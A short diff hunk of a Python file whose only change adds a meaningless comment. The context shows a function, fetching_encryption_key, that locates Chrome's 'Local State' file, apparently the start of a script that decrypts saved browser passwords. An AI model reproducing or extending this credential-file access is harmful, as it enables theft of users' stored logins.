@@ -11,7 +11,7 @@ import subprocess
 import re
 
 
-
+#fgfg
 
 def fetching_encryption_key():
     local_computer_directory_path = os.path.join( os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome','User Data', 'Local State')
